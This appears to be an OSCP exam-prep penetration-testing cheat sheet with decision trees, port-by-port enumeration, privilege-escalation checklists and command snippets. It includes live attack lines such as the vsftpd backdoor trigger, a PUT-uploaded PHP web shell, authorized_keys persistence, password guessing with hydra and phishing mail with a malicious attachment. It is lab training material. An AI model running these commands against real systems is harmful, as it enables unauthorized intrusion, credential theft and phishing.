Search convention: Ctrl+F a tag such as [PORT:445], [LINUX:SUID], [WIN:SEIMPERSONATE], [AD:KERBEROS], or [ERROR:KRB_SKEW].






C0. THE 20-SECOND OPERATING LOOP


OBSERVATION
    ↓
What does it PROVE?
    ↓
What is the highest-signal NEXT CHECK?
    ↓
Can I validate it in ≤5 minutes?
    ├─ YES → validate
    └─ NO  → park it and enumerate another surface
    ↓
New access / credential / route / privilege?
    ├─ YES → RE-ENUMERATE EVERYTHING RELEVANT
    └─ NO  → rotate



Signal priority


HIGH
  working credential
  writable privileged object
  exploitable AD edge
  privileged scheduled execution
  internal service with auth bypass/known creds
  exact vulnerable configuration
      → pursue immediately

MEDIUM
  exact version + plausible PoC
  backup/config/source disclosure
  unusual internal listener
  interesting group/privilege with unclear path
      → validate quickly

LOW
  scanner-only CVE hit
  exploit missing prerequisites
  generic "old version"
  repeated fuzzing with no evidence
  exotic CTF idea unsupported by observations
      → park





C0.5 V19 RELIABILITY FILTER


BEFORE RUNNING A TECHNIQUE:
  1. prerequisite proven?
  2. exact build/config known?
  3. privileged trigger reachable?
  4. action exam-compatible?
  5. expected success signal known?

YES → execute
NO  → enumerate/validate first



Fast labels:


✓ = try early when prerequisite matches
△ = fallback / needs stronger validation
! = last resort
⚠️ = OffSec restriction applies
❌ = do not use on the exam



Search [V19:FALSE-POSITIVE] before spending >10 minutes on a weak hypothesis.




C1. PORT → FIRST ACTION INDEX






Port / clue
Search tag
First 2–4 actions






21 FTP
[PORT:21]
anonymous → recursive list/download → writable dir → exact version




22 SSH
[PORT:22]
banner → known creds/key → username reuse → key/config/history




25/465/587 SMTP
[PORT:25]
banner → user enum → relay → mail/app clues




53 DNS
[PORT:53]
AXFR → records → hostnames → vhosts → AD DNS




80/443/8000/8080/8443
[WEB:ENUM]
source/headers → robots/sitemap → dirs/files → vhosts → auth/params/uploads




88 Kerberos
[AD:KERBEROS]
domain/DC/DNS/time → users → AS-REP/SPNs → graph




111/2049 RPC/NFS
[LINUX:NFS]
rpcinfo → showmount → mount → permissions → no_root_squash




135/139/445 SMB/RPC
[PORT:445]
null/guest → shares → users → files → credential validation




161 UDP SNMP
[PORT:161]
communities → users/processes/software/routes




389/636/3268/3269 LDAP
[AD:LDAP]
naming context → users/groups/computers → relationships




1433 MSSQL
[PORT:1433]
creds → DB context → impersonation/linked servers → command context




1521 Oracle
[PORT:1521]
SID/service enum → creds → DB privilege/context




3306 MySQL
[PORT:3306]
creds → databases → secrets → local privilege implications




3389 RDP
[PORT:3389]
validate creds → local/domain context → saved creds/session




5985/5986 WinRM
[PORT:5985]
validate creds → Evil-WinRM → local enum




6379 Redis
[PORT:6379]
auth? → keys/data → config/write capability




27017 MongoDB
[PORT:27017]
auth? → DBs/collections → app secrets




5900+ VNC
[PORT:5900]
auth/version → known creds → desktop context




Unknown service
[SERVICE:UNKNOWN]
banner → TLS cert → HTTP probe → manual protocol → exact product/version






If Windows-like ports appear together


88 + 389 + 445 + 53
       ↓
Likely AD / possibly DC
       ↓
STOP treating each service as unrelated
       ↓
[AD:FLOW]





C2. WEB — 5-MINUTE TRIAGE


Search: [WEB:ENUM]


1. Correct hostname?
2. View source.
3. Headers + cookies + framework.
4. robots.txt / sitemap.xml.
5. Content discovery.
6. Vhost discovery.
7. Login/default creds.
8. Parameters/API endpoints.
9. Upload functionality.
10. Backup/config/source files.



Symptom → branch






Observation
Jump






parameter changes DB-like behavior
[WEB:SQLI]




file/path parameter
[WEB:LFI]




upload form
[WEB:UPLOAD]




command-like backend feature
[WEB:CMDI]




URL fetch/import/webhook
[WEB:SSRF]




template/render preview
[WEB:SSTI]




weak login/reset/session behavior
[WEB:AUTH]




WordPress/Joomla/Drupal/etc.
[WEB:CMS]




XML input
[WEB:XXE]




object IDs / user-owned records
[WEB:IDOR]






403 reset


Search: [ERROR:403]


403
 ↓
correct host/vhost?
 ↓
authenticated vs unauthenticated?
 ↓
path normalization / alternate path?
 ↓
different method?
 ↓
parent/child route exposed?
 ↓
reverse proxy/backend difference?



Do not spend 30 minutes blindly changing headers with no new signal.




C3. I HAVE A CREDENTIAL — WHAT NOW?


Search: [CREDS:FANOUT]


PASSWORD
  ↓
Is it local or domain?
  ↓
SMB
WinRM
RDP
MSSQL
LDAP/Kerberos
SSH
Web application
  ↓
new privilege / shell / share / host?
  ↓
RE-ENUMERATE



Quick validation


# SMB
nxc smb $IP -u user -p 'Password'
nxc smb $IP -u user -p 'Password' --shares

# WinRM
nxc winrm $IP -u user -p 'Password'

# RDP
nxc rdp $IP -u user -p 'Password'

# MSSQL
nxc mssql $IP -u user -p 'Password'



# SSH
ssh user@$IP



Hash


nxc smb $IP -u Administrator -H NTLM_HASH --local-auth



What to record


USER:
SECRET TYPE:
SECRET:
SOURCE HOST:
SOURCE PATH/COMMAND:
LOCAL OR DOMAIN:
VALID ON:
ACCESS GAINED:





C4. I HAVE A LINUX SHELL — WHAT NOW?


Search: [LINUX:TREE]


First 90 seconds


id
whoami
hostname
uname -a
cat /etc/os-release
ip a
ip route
cat /etc/hosts
cat /etc/resolv.conf
ss -lntup 2>/dev/null || netstat -antup 2>/dev/null
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps auxww
mount
findmnt
env



Attack order


sudo
 ↓
SUID/SGID
 ↓
capabilities
 ↓
writable privileged files/dirs
 ↓
cron/systemd
 ↓
services
 ↓
PATH/library/module/plugin
 ↓
credentials/history/config
 ↓
Docker/LXC/NFS
 ↓
custom application
 ↓
kernel/package CVE LAST



Output recognition


sudo -l → NOPASSWD binary
    → [LINUX:SUDO]

unknown SUID binary
    → [LINUX:SUID]
    → strings → strace/ltrace → dependency → writable? → trigger

cap_* on unusual binary
    → [LINUX:CAPABILITIES]

root script/timer/service + writable dependency
    → [LINUX:SYSTEMD] or [LINUX:CRON]

docker/lxd group
    → [LINUX:CONTAINER]

no_root_squash
    → [LINUX:NFS]



Custom SUID micro-tree


CUSTOM SUID
   ↓
file / ldd / strings
   ↓
Does it call external command?
   ├─ YES → absolute path?
   │          ├─ NO → PATH hijack candidate
   │          └─ YES → target writable?
   ↓
Does it load config/library/plugin?
   ├─ YES → attacker-writable?
   ↓
strace/ltrace confirms dependency?
   ↓
Can privileged execution be triggered safely?
   ↓
validate → exploit → prove root





C5. I HAVE A WINDOWS SHELL — WHAT NOW?


Search: [WIN:TREE]


First 90 seconds


whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
schtasks /query /fo LIST /v
net user
net localgroup administrators



Attack order


token privileges
 ↓
services
 ↓
scheduled tasks
 ↓
writable files/directories
 ↓
registry/autoruns
 ↓
DLL/EXE/PATH
 ↓
named pipes/IPC
 ↓
DPAPI/credential stores
 ↓
LAPS/local admin secrets
 ↓
backup/restore/debug privileges
 ↓
drivers/kernel LAST



Output recognition


SeImpersonatePrivilege Enabled
    → [WIN:SEIMPERSONATE]

SYSTEM service + writable executable/dir
    → [WIN:SERVICE]

SYSTEM scheduled task + writable script/binary
    → [WIN:TASK]

SeBackupPrivilege
    → [WIN:BACKUP]

interesting DPAPI / saved credentials
    → [WIN:DPAPI]

readable LAPS material / delegated access
    → [WIN:LAPS]



Service micro-tree


SERVICE
  ↓
Runs as SYSTEM/high privilege?
  ↓
Can I change service config?
  ├─ YES → controlled executable path
  ↓
Binary writable?
  ├─ YES → replacement path
  ↓
Parent dir writable?
  ├─ YES → replacement/hijack candidate
  ↓
Unquoted path?
  ├─ YES → candidate path writable?
  ↓
DLL dependency/load failure?
  ├─ YES → [WIN:DLL]
  ↓
Can I start/restart/trigger?
  ↓
validate before changing anything

DC + DNS + DOMAIN + TIME correct?
   ↓

   ↓

   ↓

   ↓
BloodHound
   ↓

   ↓
shell / lateral movement
   ↓
new host
   ↓

Fast commands


nxc smb $DC -u user -p 'Password'
nxc smb $DC -u user -p 'Password' --shares



Then jump to:


[AD:KERBEROS]
[AD:BLOODHOUND]
[AD:ACL]
[AD:ADCS]
[AD:LATERAL]



AD output recognition


BloodHound GenericAll / GenericWrite
  → [AD:ACL]

WriteDacl / WriteOwner
  → [AD:ACL]

certificate template weakness
  → [AD:ADCS]

SPN on service account
  → [AD:KERBEROS]

user without preauth
  → [AD:KERBEROS]

new machine / new subnet
  → [PIVOT:FLOW]





C7. SEIMPERSONATE — 30-SECOND BRANCH


Search: [WIN:SEIMPERSONATE]


SeImpersonate / SeAssignPrimaryToken
             ↓
Exact Windows build?
             ↓
Service account/context?
             ↓
Required RPC/service primitive available?
             ↓
Which technique is compatible?
             ↓
test with harmless identity command
             ↓
SYSTEM?



Never reduce this to:


SeImpersonate = run random Potato



The exact OS/context/prerequisites still matter.




C8. PIVOT — FAST CHOICE


Search: [PIVOT:FLOW]


I need a subnet routed like local traffic
    → [PIVOT:LIGOLO]

HTTP-friendly tunnel / SOCKS / port forward
    → [PIVOT:CHISEL]

SSH already available
    → [PIVOT:SSH]

single quick TCP relay
    → [PIVOT:SOCAT]



Before blaming the tunnel


Search: [ERROR:PIVOT]


1. Can pivot host reach destination itself?
2. Correct destination subnet?
3. Tunnel session alive?
4. Route/forward actually created?
5. DNS resolution happening on the correct side?
6. Tool using expected proxy/interface/path?





C9. SHELL STABILIZATION


Search: [SHELL:STABLE]


Linux


python3 -c 'import pty; pty.spawn("/bin/bash")'



Then for a classic netcat shell:


Ctrl+Z
stty raw -echo; fg
Enter
export TERM=xterm
stty rows 40 columns 120



Fallbacks:


python -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
/bin/bash -i



Recovery:


reset
stty sane



Windows


basic cmd
  ↓
PowerShell available?
  ↓
better transfer/enum
  ↓
WinRM creds?
  ↓
prefer stable Evil-WinRM session





C10. COMMON ERROR DECODER


Kerberos


Search: [ERROR:KRB_SKEW]


KRB_AP_ERR_SKEW
  → time mismatch

Cannot contact KDC
  → DNS/routing/hostname/88 first

KDC_ERR_PREAUTH_FAILED
  → secret/principal mismatch

KDC_ERR_C_PRINCIPAL_UNKNOWN
  → user/domain/principal naming issue



Checks:


getent hosts $DC
nc -vz $DC 88
date



SMB


Search: [ERROR:SMB]


STATUS_LOGON_FAILURE
  → auth material/domain format

STATUS_ACCESS_DENIED
  → auth may work; authorization does not

BAD_NETWORK_NAME
  → wrong share



WinRM


Search: [ERROR:WINRM]


SMB creds work, WinRM does not
  → verify 5985/5986 + authorization for remote management



Reverse shell


Search: [ERROR:SHELL]


no connection
  → LHOST/interface/routing/firewall

connect then close
  → process exits / payload mismatch / AV / unstable shell

weird terminal
  → stabilize before changing exploit





C11. EXPLOIT GO / NO-GO


Search: [EXPLOIT:GATE]


exact product/version?
      ↓
exact OS/build/arch?
      ↓
affected component/config present?
      ↓
required privilege/access present?
      ↓
required service/module/feature present?
      ↓
PoC matches this variant?
      ↓
expected success/failure signal known?
      ↓
acceptable disruption risk?
      ↓
RUN



Park the exploit if:


2+ critical prerequisites are still UNKNOWN



Especially for kernel/driver exploits.

[ ] local.txt read from original location
[ ] local flag submitted
[ ] local proof screenshot valid
[ ] root/SYSTEM path documented
[ ] proof.txt read from original location
[ ] proof flag submitted
[ ] proof screenshot valid
[ ] pivot/routes recorded
[ ] report steps reproducible

C13. STUCK RESET — 3 MINUTES MAX


Search: [STUCK:RESET]


WHAT DO I KNOW?
  ports
  exact versions
  creds
  privileges
  files
  routes
  graph edges

WHAT AM I ASSUMING?
  "this CVE should work"
  "there is only one vhost"
  "credential is local only"
  "WinPEAS would show everything"
  "service is unreachable"

WHAT DID I MISS?
  full TCP
  useful UDP
  DNS/vhosts
  source/backups/config
  credential reuse
  internal listeners
  post-shell re-enumeration
  DNS/time in AD
  writable privileged dependency

WRITE ONLY NEXT 3 ACTIONS.



If none of the next three actions can produce new evidence, rotate targets/surfaces.

1. PRE-ENGAGEMENT SETUP



⚙️ 1.1 Environment & Variables

# Set once, use everywhere
export IP=10.10.10.x
export LHOST=10.10.14.x       # Your tun0 IP
export LPORT=4444
export DOMAIN=domain.local
export DC=dc01.domain.local

# Get your tun0 IP automatically
export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# Confirm
echo "[*] Target: $IP | LHOST: $LHOST:$LPORT"






📁 1.2 Directory Structure

mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
cd ~/oscp/$IP

# Fast template function — add to ~/.bashrc
function newbox() {
  export IP=$1
  mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
  cd ~/oscp/$IP
  echo "[+] Workspace ready for $IP"
}
# Usage: newbox 10.10.10.x






🖥️ 1.3 tmux Setup (NEVER work without it)

# Record everything
script -q -c "zsh" ~/oscp/$IP/terminal_$(date +%Y%m%d_%H%M).log

# Start session
tmux new -s oscp

# Essential keybinds:
# Ctrl+B %       → Split vertical
# Ctrl+B "       → Split horizontal
# Ctrl+B o       → Switch pane
# Ctrl+B z       → Zoom pane (fullscreen toggle)
# Ctrl+B [       → Scroll mode (q to exit)
# Ctrl+B d       → Detach (session stays alive)
# tmux attach    → Reattach

# Recommended 4-pane layout:
# ┌─────────────┬─────────────┐
# │  nmap/enum  │ shell/nc    │
# ├─────────────┼─────────────┤
# │  exploit    │ notes/misc  │
# └─────────────┴─────────────┘






📚 1.4 Wordlists --- Every Important Path

# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# EXAM RULE REMINDERS:
# - Burp Community/Free is an allowed example; Burp Pro/commercial offensive services are prohibited.
# - SQLmap: PROHIBITED on OSCP+; no SQLmap workflow is included here.
# - Responder poisoning/spoofing: PROHIBITED action.
# - Metasploit restricted functionality: ONE selected target.

# Prefer Kali packages over surprise pip upgrades immediately before the exam:
# sudo apt install netexec python3-impacket bloodhound bloodhound-ce-python certipy-ad






🔥 1.6 Pre-Exam Checklist

[ ] VPN connected — verify with: ping $IP
[ ] tun0 interface up — ip a show tun0
[ ] Burp Suite running, proxy configured
[ ] /etc/hosts ready to add entries
[ ] Note-taking app open (Obsidian/CherryTree)
[ ] Terminal logged (script command)
[ ] Exam control panel open
[ ] Screenshots folder ready
[ ] Known good shells: nc listener test, msfvenom test payload
[ ] Clock started — note exam end time
[ ] ProtonVPN/any other VPN DISCONNECTED (use only exam VPN)
[ ] Phone on silent — no interruptions
[ ] Water, snacks ready







2. RECONNAISSANCE & HOST DISCOVERY



🌐 2.1 Network Sweep --- Find Live Hosts

# Ping sweep
nmap -sn 10.10.10.0/24 --open -oN scans/nmap/hosts.txt

# ARP scan (more reliable on local network)
netdiscover -r 10.10.10.0/24 -i tun0
arp-scan -l

# fping
fping -a -g 10.10.10.0/24 2>/dev/null

# Range discovery only when scope and routing justify it
masscan -p0-65535 10.10.10.0/24 --rate=10000






📝 2.2 /etc/hosts Management

# Add target to hosts
echo "$IP domain.local dc01.domain.local" >> /etc/hosts

# Tip: Always check if web app needs hostname vs IP
# Some apps only respond to hostname (virtual hosting)
curl -H "Host: domain.local" http://$IP/

# Vhost discovery
gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$IP -H "Host: FUZZ.domain.local" -fs 0







3. NMAP & PORT SCANNING



🔍 3.1 Nmap Workflow --- Fast Default, Adaptive Rate

# STEP 0: Create output directory once
mkdir -p scans/nmap

# STEP 1: Full TCP scan — conservative VPN baseline; adapt to packet loss
sudo nmap -Pn -n -p- --min-rate 1000 -oA scans/nmap/tcp-all $IP &
# If results look sparse or packets drop, reduce/remove --min-rate and retry a small known set.

# STEP 2: Meanwhile, top 1000 with scripts (quicker results while full scan runs)
sudo nmap -Pn -n -sC -sV --top-ports 1000 -oA scans/nmap/tcp-initial $IP &

# STEP 3: When all-ports finishes, targeted deep scan
ports=$(awk -F/ '/^[0-9]+\/tcp[[:space:]]+open/{print $1}' scans/nmap/tcp-all.nmap | paste -sd, -)
echo "Open ports: $ports"
test -n "$ports" && sudo nmap -Pn -n -sC -sV -p "$ports" -oA scans/nmap/tcp-detail $IP

# STEP 4: Targeted UDP when the host role, TCP results or remaining hypothesis justifies it
sudo nmap -Pn -n -sU --top-ports 100 -oA scans/nmap/udp-top100 $IP &
# Critical UDP: 53,67,68,69,111,123,137,138,139,161,162,500,514,1194,1900

# STEP 5: Run only a selected, relevant NSE script after reviewing its behavior
SCRIPT='<relevant-script>'
nmap --script-help "$SCRIPT"
test -n "$ports" && sudo nmap -Pn -n --script "$SCRIPT" -p "$ports" -oA scans/nmap/nse-selected $IP

# STEP 6: OS detection only when it will change the next decision
test -n "$ports" && sudo nmap -Pn -n -O --osscan-guess -p "$ports" -oA scans/nmap/os $IP






⚡ 3.2 Nmap Tips & Tricks

# Controlled acceleration — reduce/remove the floor if results look incomplete
--min-rate 1000 --max-retries 2

# If firewall dropping packets — use these
nmap -sS -p$ports $IP              # SYN scan
nmap -sA -p$ports $IP              # ACK scan (firewall rules)
nmap -sN -p$ports $IP              # NULL scan
nmap -sF -p$ports $IP              # FIN scan

# If host appears "down" but you know it's up
nmap -Pn $IP                       # Skip host discovery
nmap -Pn --disable-arp-ping $IP

# Scan through proxychains (for pivoting)
proxychains nmap -sT -Pn -p 80,443,445,22,3389 192.168.x.x

# Output all formats at once
nmap -sC -sV -p$ports $IP -oA scans/nmap/targeted

# Extract just open port numbers from result
grep "open" scans/nmap/targeted.txt | awk '{print $1}' | cut -d'/' -f1

# Parse nmap XML with python (automation)
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scans/nmap/targeted.xml')
for port in tree.findall('.//port[@protocol=\"tcp\"]'):
    state = port.find('state').get('state')
    if state == 'open':
        print(port.get('portid'), port.find('service').get('name',''), port.find('service').get('product',''))
"






🚀 3.3 AutoRecon — Background Assistant, Manual Enumeration Still Primary

# Basic
sudo autorecon $IP

# Multiple targets
sudo autorecon 10.10.10.1 10.10.10.2 10.10.10.3

# With options
sudo autorecon $IP --single-target --output ~/oscp/$IP/scans

# Autorecon output structure:
# results/$IP/
# ├── scans/
# │   ├── _quick_tcp_nmap.txt
# │   ├── _full_tcp_nmap.txt
# │   ├── _top_20_udp_nmap.txt
# │   ├── tcp80/            ← web enum if port 80 found
# │   ├── tcp445/           ← smb enum if port 445 found
# │   └── ...
# └── report/

# TIP: While AutoRecon runs, manually enumerate the highest-signal services.
# Do NOT let automated output become a substitute for reading Nmap/service output.
# Recent 2026 exam feedback repeatedly mentions missed clues sitting directly in tool output.
# Work in parallel, but maintain one concise findings table per target.







4. SERVICE ENUMERATION --- EVERY PORT



📁 4.1 FTP --- Port 21

[PORT:21] [SERVICE:FTP]


# ── FINGERPRINT ──────────────────────────────────────────────
banner=$(nc -nv $IP 21 2>&1 | head -1)
echo $banner                     # Note version!
searchsploit $(echo $banner | awk '{print $1,$2}')

# ── ANONYMOUS LOGIN ───────────────────────────────────────────
ftp $IP
# user: anonymous  pass: (blank) or anonymous@domain.com or press Enter
ftp> ls -la              # Show hidden files
ftp> pwd                 # Where are we?
ftp> binary              # ALWAYS set binary mode before downloading
ftp> get file.txt
ftp> mget *              # Get all files
ftp> put shell.php       # Upload if writable!
ftp> passive             # Toggle passive mode if connection issues

# ── RECURSIVE DOWNLOAD ────────────────────────────────────────
wget -m --no-passive ftp://anonymous:anonymous@$IP
wget -m ftp://user:pass@$IP
# Or with credentials from URL:
curl --user 'anonymous:' --list-only "ftp://$IP/"

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -L users.txt -P "$SHORTLIST" $IP ftp -t 2 -V
test -s "$SHORTLIST" && medusa -h $IP -U users.txt -P "$SHORTLIST" -M ftp -t 2

# ── NMAP SCRIPTS ──────────────────────────────────────────────
nmap -Pn -n --script ftp-anon,ftp-syst -p21 $IP

# ── KNOWN VULNERABILITIES ─────────────────────────────────────
# vsftpd 2.3.4 → BACKDOOR → connects on port 6200 after :) in username
nmap --script ftp-vsftpd-backdoor $IP
# Manual trigger:
echo -e "USER user:)\nPASS pass" | nc $IP 21
nc $IP 6200         # Should give shell

# ProFTPd mod_copy → unauthenticated file copy (CVE-2015-3306)
nc $IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Then curl http://$IP/passwd.txt

# ── TIPS ──────────────────────────────────────────────────────
# Always check:
#   - config files (.conf, .ini, .cfg)
#   - .bash_history
#   - backup files (.bak, .old, .zip)
#   - Database dumps (.sql)
#   - SSH keys (id_rsa, authorized_keys)






🔐 4.2 SSH --- Port 22

[PORT:22] [SERVICE:SSH]


# ── FINGERPRINT ───────────────────────────────────────────────
ssh -V
nc -nv $IP 22 2>&1 | head -1     # Banner = version
nmap -sV -p22 $IP                 # Also shows version

# ── ALGORITHM ENUMERATION ─────────────────────────────────────
nmap --script ssh2-enum-algos -p22 $IP
ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" user@$IP  # Old algos
# If "no matching key exchange" error:
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 user@$IP

# ── USER ENUMERATION (CVE-2018-15473) ─────────────────────────
python3 /usr/share/exploitdb/exploits/linux/remote/45233.py $IP 22 root
# Or:
# MSF ONE-TARGET LOCK — only after choosing this target: use auxiliary/scanner/ssh/ssh_enumusers

# ── PRIVATE KEY USAGE ─────────────────────────────────────────
chmod 600 id_rsa
ssh -i id_rsa user@$IP
ssh -i id_rsa user@$IP -p 2222   # Custom port
# If passphrase protected:
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
hashcat -m 22921 id_rsa.hash rockyou.txt

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP ssh -t 2 -f
test -s "$SHORTLIST" && hydra -L users.txt -P "$SHORTLIST" $IP ssh -t 2 -f

# ── COMMON DEFAULT CREDS ──────────────────────────────────────
# root:root | admin:admin | pi:raspberry | vagrant:vagrant
# ubuntu:ubuntu | user:user | guest:guest

# ── USEFUL FLAGS ──────────────────────────────────────────────
ssh -o StrictHostKeyChecking=no user@$IP            # Skip host check
ssh -o UserKnownHostsFile=/dev/null user@$IP        # Don't save to known_hosts
ssh user@$IP -L 8080:localhost:80                   # Local port forward
ssh user@$IP -D 1080                                # SOCKS proxy
ssh user@$IP -N -f -L 8080:127.0.0.1:80            # Background tunnel

# ── WRITE AUTHORIZED_KEYS (if .ssh dir writable) ──────────────
ssh-keygen -t rsa -b 4096 -f /tmp/oscp_key -N ""
cat /tmp/oscp_key.pub     # Copy this
# On target:
echo "PUBKEY" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
# Connect:
ssh -i /tmp/oscp_key user@$IP

# ── CVEs ──────────────────────────────────────────────────────
# OpenSSH < 7.7 → User enumeration (CVE-2018-15473)
# OpenSSH 7.2p1 → Xauth injection
searchsploit openssh 7.2






📧 4.3 SMTP --- Port 25 / 465 / 587

[PORT:25] [PORT:465] [PORT:587] [SERVICE:SMTP]


# ── FINGERPRINT ───────────────────────────────────────────────
nc -nv $IP 25
nmap -sV --script smtp-commands,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25 $IP

# ── USER ENUMERATION ──────────────────────────────────────────
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP -D domain.com

# Manual:
nc -nv $IP 25
EHLO test
VRFY root
VRFY admin
VRFY www-data
EXPN root       # Expand alias
RCPT TO:root    # Check if user exists

# ── SEND PHISHING MAIL (if open relay) ────────────────────────
swaks --to victim@domain.com --from admin@domain.com --server $IP
swaks --to victim@domain.com --from admin@domain.com --server $IP \
      --body "Click: http://$LHOST/file" --header "Subject: Important"

# ── MAIL WITH ATTACHMENT (Phishing) ───────────────────────────
swaks --to victim@domain.com --from admin@domain.com --server $IP \
      --attach /path/to/malicious.file --header "Subject: Report"

# ── RELAY TEST ────────────────────────────────────────────────
nmap --script smtp-open-relay $IP -p25
# If relay open → use to enumerate internal users, phish, or pivot






🌐 4.4 DNS --- Port 53

[PORT:53] [SERVICE:DNS]


# ── BASIC QUERIES ─────────────────────────────────────────────
dig @$IP domain.com
dig @$IP domain.com ANY
nslookup domain.com $IP

# ── ZONE TRANSFER (massive info dump — try ALWAYS) ────────────
dig axfr @$IP domain.com
dig axfr @$IP $(dig @$IP +short SOA domain.com | awk '{print $1}')
# dnsrecon:
dnsrecon -d domain.com -t axfr -n $IP
# If zone transfer works — add ALL discovered hosts to /etc/hosts

# ── REVERSE DNS ───────────────────────────────────────────────
dig -x $IP @$IP
nmap -R -sL $IP/24    # Reverse lookup entire subnet

# ── SUBDOMAIN BRUTE FORCE ─────────────────────────────────────
dnsrecon -d domain.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt -n $IP
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP:53
fierce --domain domain.com --dns-servers $IP
amass enum -d domain.com -r $IP

# ── DNSSEC ────────────────────────────────────────────────────
dig @$IP domain.com DNSKEY
dig @$IP domain.com DS

# ── TIPS ──────────────────────────────────────────────────────
# DNS on TCP = zone transfer
# DNS on UDP = normal queries
# If port 53 TCP open → zone transfer likely possible
# Always try: dig axfr — worst case is REFUSED
# Discovered hosts → add to /etc/hosts → re-run web enum






🌍 4.5 HTTP / HTTPS --- Ports 80, 443, 8080, 8443, 8000, 8888

[WEB:ENUM] [PORT:80] [PORT:443] [VHOST]



# __ Nginx _________________
https://github.com/DepthFirstDisclosures/Nginx-Rift

# ── INITIAL FINGERPRINT ───────────────────────────────────────
whatweb http://$IP -a 3    # -a 3 = aggressive
curl -I http://$IP          # Headers (Server, X-Powered-By, etc.)
curl -sL http://$IP | head -100   # Quick source check

# ── CONTENT DISCOVERY COMBO (run all simultaneously) ──────────
# Gobuster — fast, reliable
# try DirBuster-2007_directory-list-2.3-medium.txt if you get nothing from raft
gobuster dir -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,asp,aspx,jsp,py,rb,bak,old,zip,gz,sql,json,xml,config \
  -t 50 -o scans/web/gobuster.txt

# Feroxbuster — recursive (finds /admin/login, /api/v1/users etc.)
feroxbuster -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,asp,aspx -t 50 --depth 3 -o scans/web/ferox.txt

# FFUF — best for parameter fuzzing
ffuf -u http://$IP/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -o scans/web/ffuf.txt -of md

# Nikto — vuln scanner
nikto -h http://$IP -output scans/web/nikto.txt -Format txt

# ── MANUAL CHECKS (do these by hand!) ────────────────────────
# Essential paths to always check:
curl -s http://$IP/robots.txt
curl -s http://$IP/sitemap.xml
curl -s http://$IP/.git/HEAD            # Exposed git repo!
curl -s http://$IP/.git/config
curl -s http://$IP/.env                 # Environment vars
curl -s http://$IP/config.php
curl -s http://$IP/phpinfo.php
curl -s http://$IP/wp-config.php
curl -s http://$IP/web.config
curl -s http://$IP/.htaccess
curl -s http://$IP/backup.zip
curl -s http://$IP/admin/
curl -s http://$IP/api/
curl -s http://$IP/swagger.json         # API docs
curl -s http://$IP/api/swagger.json
curl -s http://$IP/server-status        # Apache status

# ── VHOST / SUBDOMAIN DISCOVERY ──────────────────────────────
# If domain name is known:
gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -u http://$IP -H "Host: FUZZ.domain.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP)    # Filter by default response size

# ── HTTPS SPECIFIC ────────────────────────────────────────────
# Check certificate for hostnames/emails
openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "DNS:|Subject:"
# SSL vulnerabilities
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 $IP
sslscan $IP:443
testssl.sh $IP

# ── PARAMETER FUZZING ─────────────────────────────────────────
# Find hidden parameters on a page
ffuf -u "http://$IP/page.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP/page.php)

# ── HTTP METHODS ──────────────────────────────────────────────
curl -X OPTIONS http://$IP/ -v
# If PUT allowed:
curl -X PUT http://$IP/shell.php -d "<?php system(\$_GET['cmd']); ?>"
# If TRACE allowed → Cross-Site Tracing possible

# ── DEFAULT CREDENTIALS TABLE ─────────────────────────────────
# Always check these on every web app:
# Tomcat:        admin:admin | tomcat:tomcat | admin:s3cr3t | tomcat:s3cr3t
# Jenkins:       admin:admin | admin:(blank)
# phpMyAdmin:    root:(blank) | root:root | root:toor
# Nagios:        nagiosadmin:nagios
# Grafana:       admin:admin
# Kibana:        elastic:changeme
# Splunk:        admin:changeme
# WebLogic:      weblogic:weblogic | weblogic:welcome1
# JBoss:         admin:admin
# Glassfish:     admin:adminadmin
# Roundcube:     admin:admin
# Zabbix:        Admin:zabbix
# Cacti:         admin:admin
# OpenVPN AS:    admin:admin
# Plex:          admin:admin
